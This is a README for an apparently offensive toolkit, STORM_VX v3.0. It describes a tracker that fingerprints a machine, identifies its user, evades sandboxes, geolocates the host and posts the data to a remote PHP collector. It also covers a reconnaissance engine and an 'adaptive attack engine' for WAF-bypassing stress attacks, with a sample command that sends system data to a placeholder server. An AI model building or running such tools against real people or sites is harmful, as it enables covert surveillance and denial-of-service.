# ⚡ STORM_VX v3.0

Advanced Network Testing & System Tracking Framework

## 🔧 Components

| Component | File | Description |
|-----------|------|-------------|
| **VF_TRACKER** | `tracker/VF_TRACKER.py` | System Identity Tracker - Hardware fingerprint, user identity, environment detection |
| **VF_FINDER** | `finder/VF_FINDER.py` | Target Reconnaissance Engine - Technology detection, WAF identification, attack profiling |
| **VF_TESTER** | `tester/VF_TESTER.py` | Adaptive Attack Engine - Multi-strategy stress testing with WAF bypass |
| **receive.php** | `tracker/receive.php` | Tracker Receiver Endpoint - PHP server-side data collector |

## 🚀 Quick Start

### Windows
```batch
run.bat
```

### Linux
```bash
chmod +x run.sh
./run.sh
```

### Individual Components
```bash
# Tracker - Collect system info
python VF_TRACKER.py --server http://your-server.com/receive.php --token YOUR_TOKEN

# Finder - Recon target
python VF_FINDER.py --target https://example.com

# Tester - Stress test
python VF_TESTER.py --profile VF_PROFILE.json
```

## 📁 Structure

```
Storm-Vx/
├── tracker/
│   ├── VF_TRACKER.py      # System tracker client
│   └── receive.php         # Tracker server endpoint
├── finder/
│   └── VF_FINDER.py        # Target reconnaissance
├── tester/
│   ├── VF_TESTER.py        # Adaptive attack engine
│   ├── combined_tester_v2.py
│   ├── combined_tester_v3.py
│   └── combined_tester_v4.py
├── reports/
│   ├── VF_TRACKER_REPORT.txt
│   ├── VF_TRACKER_REPORT.json
│   └── VF_ATTACK_REPORT.json
├── VF_PROFILE.json         # Attack profile config
├── example_script.json     # Example script config
├── proxies_example.txt     # Proxy list example
├── run.bat                 # Windows pipeline runner
└── run.sh                  # Linux pipeline runner
```

## ⚙️ Configuration

### VF_PROFILE.json
Main configuration file for attack parameters:
- Target URL and strategy
- Worker count and ramp-up speed
- WAF bypass settings
- Evasion techniques

### Tracker Token
Both `VF_TRACKER.py` and `receive.php` must use the same token:
- PHP: `define('VF_SECRET_TOKEN', 'xxx');`
- Python: `VF_SECRET_TOKEN = 'xxx'`

## 🛡️ Features

### VF_TRACKER v3.0
- Hardware fingerprint (Motherboard, BIOS, CPU, Disk, GPU)
- User identity detection
- VM/Sandbox detection
- Network recon (WiFi, ARP, ISP)
- Geolocation with Google Maps link
- Remote reporting via HTTP POST
- Retry logic with WAF detection

### VF_FINDER
- Technology stack detection
- WAF/CDN identification (ArvanCloud, Cloudflare, etc.)
- Attack profile generation
- SSL/TLS analysis

### VF_TESTER
- Multiple attack strategies
- Adaptive WAF bypass
- Cache busting
- Random User-Agent rotation
- Auto-escalation on success
- Real-time statistics

---
*For authorized testing only.*
